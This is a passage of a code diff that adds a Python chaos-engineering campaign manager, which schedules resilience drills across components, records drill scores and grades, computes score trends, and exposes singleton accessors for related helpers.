+            available = ", ".join(self._TEMPLATES.keys())
+            raise ValueError(f"Unknown template '{template}'. Available: {available}")
+
+        tmpl = self._TEMPLATES[template]
+        campaign_id = str(uuid.uuid4())
+        now = datetime.now(timezone.utc)
+
+        start_dt = datetime.fromisoformat(start_date) if start_date else now
+        if start_dt.tzinfo is None:
+            start_dt = start_dt.replace(tzinfo=timezone.utc)
+
+        duration = tmpl["duration_days"]
+        end_dt = start_dt + timedelta(days=duration)
+        drill_count = tmpl["drill_count"]
+
+        # Distribute drills evenly across the campaign duration
+        drill_interval = duration / drill_count
+        scenarios = tmpl["scenarios"]
+        severity_progression = tmpl["severity_progression"]
+
+        # Cycle components across drills
+        drills: List[CampaignDrill] = []
+        for i in range(drill_count):
+            scheduled_dt = start_dt + timedelta(days=i * drill_interval)
+            component = target_components[i % len(target_components)]
+            scenario = scenarios[i % len(scenarios)]
+            drills.append(CampaignDrill(
+                drill_id=str(uuid.uuid4()),
+                scenario_name=scenario,
+                target_component=component,
+                scheduled_date=scheduled_dt.isoformat(),
+                status="pending",
+            ))
+
+        campaign = Campaign(
+            campaign_id=campaign_id,
+            name=custom_name or tmpl["name"],
+            description=tmpl["description"],
+            template=template,
+            org_id=org_id,
+            start_date=start_dt.isoformat(),
+            end_date=end_dt.isoformat(),
+            status="planning",
+            drills=drills,
+            created_at=now.isoformat(),
+        )
+
+        self._campaigns[campaign_id] = campaign
+        logger.info(
+            "Created campaign %s (template=%s, drills=%d)",
+            campaign_id, template, drill_count
+        )
+        return campaign
+
+    def start_campaign(self, campaign_id: str) -> Campaign:
+        """Transition campaign from 'planning' to 'active'.
+
+        Args:
+            campaign_id: Campaign identifier.
+
+        Raises:
+            KeyError: If campaign not found.
+            ValueError: If campaign is not in 'planning' status.
+        """
+        campaign = self._get_campaign(campaign_id)
+        if campaign.status != "planning":
+            raise ValueError(
+                f"Campaign {campaign_id} is in '{campaign.status}' status; "
+                "can only start from 'planning'"
+            )
+        campaign.status = "active"
+        logger.info("Started campaign %s", campaign_id)
+        return campaign
+
+    def record_drill_result(
+        self,
+        campaign_id: str,
+        drill_id: str,
+        score: float,
+        grade: Optional[str] = None,
+        notes: str = "",
+    ) -> Campaign:
+        """Record the result of a completed drill within a campaign.
+
+        Args:
+            campaign_id: Campaign identifier.
+            drill_id: Drill identifier within the campaign.
+            score: Numeric score (0-10).
+            grade: Optional letter grade.
+            notes: Optional notes.
+
+        Returns:
+            Updated Campaign with recalculated aggregate metrics.
+        """
+        campaign = self._get_campaign(campaign_id)
+        target_drill = next(
+            (d for d in campaign.drills if d.drill_id == drill_id), None
+        )
+        if target_drill is None:
+            raise KeyError(
+                f"Drill '{drill_id}' not found in campaign '{campaign_id}'"
+            )
+
+        target_drill.status = "completed"
+        target_drill.score = round(float(score), 2)
+        target_drill.grade = grade or self._score_to_grade(score)
+        target_drill.notes = notes
+
+        # Recalculate aggregate metrics
+        self._recalculate_aggregates(campaign)
+        logger.info(
+            "Recorded drill result: campaign=%s, drill=%s, score=%.2f",
+            campaign_id, drill_id, score
+        )
+        return campaign
+
+    def get_campaign_summary(self, campaign_id: str) -> Dict[str, Any]:
+        """Return a comprehensive campaign progress summary.
+
+        Args:
+            campaign_id: Campaign identifier.
+
+        Returns:
+            Dict with overall metrics, per-drill results, and trend analysis.
+        """
+        campaign = self._get_campaign(campaign_id)
+        completed = [d for d in campaign.drills if d.status == "completed"]
+        pending = [d for d in campaign.drills if d.status == "pending"]
+        scores = [d.score for d in completed if d.score is not None]
+
+        trend_data = self._compute_trend(scores)
+
+        return {
+            "campaign_id": campaign.campaign_id,
+            "name": campaign.name,
+            "template": campaign.template,
+            "org_id": campaign.org_id,
+            "status": campaign.status,
+            "start_date": campaign.start_date,
+            "end_date": campaign.end_date,
+            "progress": {
+                "total_drills": len(campaign.drills),
+                "completed": len(completed),
+                "pending": len(pending),
+                "skipped": sum(1 for d in campaign.drills if d.status == "skipped"),
+                "completion_rate": round(campaign.completion_rate, 3),
+            },
+            "scores": {
+                "aggregate": round(campaign.aggregate_score, 2),
+                "min": round(min(scores), 2) if scores else None,
+                "max": round(max(scores), 2) if scores else None,
+                "avg": round(statistics.mean(scores), 2) if scores else None,
+                "std_dev": round(statistics.stdev(scores), 2) if len(scores) >= 2 else None,
+            },
+            "trend": trend_data,
+            "drills": [
+                {
+                    "drill_id": d.drill_id,
+                    "scenario": d.scenario_name,
+                    "component": d.target_component,
+                    "scheduled_date": d.scheduled_date,
+                    "status": d.status,
+                    "score": d.score,
+                    "grade": d.grade,
+                }
+                for d in campaign.drills
+            ],
+        }
+
+    def list_campaigns(
+        self,
+        org_id: Optional[str] = None,
+        status: Optional[str] = None,
+    ) -> List[Dict[str, Any]]:
+        """List campaigns, optionally filtered by org and status.
+
+        Args:
+            org_id: Filter by organization ID.
+            status: Filter by campaign status.
+
+        Returns:
+            List of campaign summary dicts.
+        """
+        campaigns = list(self._campaigns.values())
+        if org_id:
+            campaigns = [c for c in campaigns if c.org_id == org_id]
+        if status:
+            campaigns = [c for c in campaigns if c.status == status]
+        return [self.get_campaign_summary(c.campaign_id) for c in campaigns]
+
+    def get_available_templates(self) -> List[Dict[str, Any]]:
+        """Return all available campaign templates with metadata.
+
+        Returns:
+            List of template summary dicts.
+        """
+        return [
+            {
+                "template_id": k,
+                "name": v["name"],
+                "description": v["description"],
+                "duration_days": v["duration_days"],
+                "drill_count": v["drill_count"],
+                "goal": v["goal"],
+            }
+            for k, v in self._TEMPLATES.items()
+        ]
+
+    def pause_campaign(self, campaign_id: str) -> Campaign:
+        """Pause an active campaign.
+
+        Args:
+            campaign_id: Campaign identifier.
+
+        Returns:
+            Updated Campaign with 'paused' status.
+        """
+        campaign = self._get_campaign(campaign_id)
+        if campaign.status != "active":
+            raise ValueError(f"Campaign '{campaign_id}' is not active")
+        campaign.status = "paused"
+        return campaign
+
+    def resume_campaign(self, campaign_id: str) -> Campaign:
+        """Resume a paused campaign.
+
+        Args:
+            campaign_id: Campaign identifier.
+
+        Returns:
+            Updated Campaign with 'active' status.
+        """
+        campaign = self._get_campaign(campaign_id)
+        if campaign.status != "paused":
+            raise ValueError(f"Campaign '{campaign_id}' is not paused")
+        campaign.status = "active"
+        return campaign
+
+    def complete_campaign(self, campaign_id: str) -> Campaign:
+        """Mark a campaign as completed.
+
+        Args:
+            campaign_id: Campaign identifier.
+
+        Returns:
+            Updated Campaign with 'completed' status.
+        """
+        campaign = self._get_campaign(campaign_id)
+        campaign.status = "completed"
+        campaign.completed_at = datetime.now(timezone.utc).isoformat()
+        self._recalculate_aggregates(campaign)
+        return campaign
+
+    # ------------------------------------------------------------------
+    # Helpers (private)
+    # ------------------------------------------------------------------
+
+    def _get_campaign(self, campaign_id: str) -> Campaign:
+        """Retrieve a campaign or raise KeyError."""
+        if campaign_id not in self._campaigns:
+            raise KeyError(f"Campaign '{campaign_id}' not found")
+        return self._campaigns[campaign_id]
+
+    def _recalculate_aggregates(self, campaign: Campaign) -> None:
+        """Recalculate aggregate_score, completion_rate, score_trend in place."""
+        completed = [d for d in campaign.drills if d.status == "completed"]
+        scores = [d.score for d in completed if d.score is not None]
+        total = len(campaign.drills)
+
+        campaign.completion_rate = len(completed) / total if total > 0 else 0.0
+        campaign.aggregate_score = statistics.mean(scores) if scores else 0.0
+        campaign.score_trend = self._compute_trend(scores).get("direction", "stable")
+
+    def _compute_trend(self, scores: List[float]) -> Dict[str, Any]:
+        """Compute trend direction and slope from score sequence."""
+        if len(scores) < 2:
+            return {"direction": "stable", "slope": 0.0, "data_points": len(scores)}
+
+        n = len(scores)
+        x_mean = (n - 1) / 2.0
+        y_mean = statistics.mean(scores)
+        numerator = sum((i - x_mean) * (scores[i] - y_mean) for i in range(n))
+        denominator = sum((i - x_mean) ** 2 for i in range(n))
+        slope = numerator / denominator if denominator != 0 else 0.0
+
+        if slope > 0.1:
+            direction = "improving"
+        elif slope < -0.1:
+            direction = "declining"
+        else:
+            direction = "stable"
+
+        return {
+            "direction": direction,
+            "slope": round(slope, 4),
+            "data_points": n,
+            "first_score": scores[0],
+            "last_score": scores[-1],
+            "delta": round(scores[-1] - scores[0], 2),
+        }
+
+    @staticmethod
+    def _score_to_grade(score: float) -> str:
+        """Convert numeric score to letter grade."""
+        if score >= 9.5:
+            return "A+"
+        elif score >= 9.0:
+            return "A"
+        elif score >= 8.0:
+            return "B+"
+        elif score >= 7.0:
+            return "B"
+        elif score >= 6.0:
+            return "C+"
+        elif score >= 5.0:
+            return "C"
+        elif score >= 4.0:
+            return "D"
+        return "F"
+
+
+# ---------------------------------------------------------------------------
+# Module-level singleton helpers
+# ---------------------------------------------------------------------------
+
+_scenario_library_instance: Optional[ScenarioLibrary] = None
+_auto_grader_instance: Optional[AutoGrader] = None
+_neglect_predictor_instance: Optional[NeglectZonePredictor] = None
+_campaign_manager_instance: Optional[ChaosCampaignManager] = None
+
+
+def get_scenario_library() -> ScenarioLibrary:
+    """Return the module-level ScenarioLibrary singleton."""
+    global _scenario_library_instance
+    if _scenario_library_instance is None:
+        _scenario_library_instance = ScenarioLibrary()
+    return _scenario_library_instance
+
+
+def get_auto_grader() -> AutoGrader:
+    """Return the module-level AutoGrader singleton."""
+    global _auto_grader_instance
+    if _auto_grader_instance is None:
+        _auto_grader_instance = AutoGrader()
+    return _auto_grader_instance
+
+
+def get_neglect_predictor() -> NeglectZonePredictor:
+    """Return the module-level NeglectZonePredictor singleton."""
+    global _neglect_predictor_instance
+    if _neglect_predictor_instance is None:
+        _neglect_predictor_instance = NeglectZonePredictor()
+    return _neglect_predictor_instance
+
+
+def get_campaign_manager() -> ChaosCampaignManager:
+    """Return the module-level ChaosCampaignManager singleton."""
+    global _campaign_manager_instance
+    if _campaign_manager_instance is None:
+        _campaign_manager_instance = ChaosCampaignManager()
+    return _campaign_manager_instance
+
